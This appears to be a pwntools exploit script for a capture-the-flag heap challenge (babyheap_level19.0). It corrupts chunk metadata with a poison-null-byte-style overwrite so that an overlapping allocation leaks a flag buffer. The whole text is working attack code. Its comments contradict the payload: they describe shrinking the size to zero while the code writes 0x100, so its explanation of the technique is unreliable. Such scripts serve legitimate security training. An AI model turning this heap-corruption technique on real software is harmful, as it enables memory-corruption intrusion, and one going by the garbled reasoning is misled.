from pwn import * 

binary = './babyheap_level19.0_patched'
p = process(binary)

# Allocate chunk A
p.sendline("malloc 0 24")

# Allocate chunk B (this will be adjacent to the flag buffer)
p.sendline("malloc 1 200")

# Allocate chunk C (to prevent top chunk consolidation)
p.sendline("malloc 2 24") 

# Free chunk B
p.sendline("free 1")

# Corrupt chunk B's metadata with a poison null byte
p.sendline("safe_read 0")
# The original size might be something like 0xd1, we'll make it 0x00
# This will make the allocator see a smaller chunk than it really is
p.sendline(b'A' * 0x10 + p64(0) + p64(0x100))  # Smaller size with null byte

# Read the flag (this will be placed right after our corrupted chunk)
p.sendline("read_flag")

# Allocate a small chunk in the free B area
p.sendline("malloc 1 88")  

# Allocate a chunk that should overlap with the flag
p.sendline("malloc 3 120")

# Print the contents
p.sendline("safe_write 3")

p.interactive()
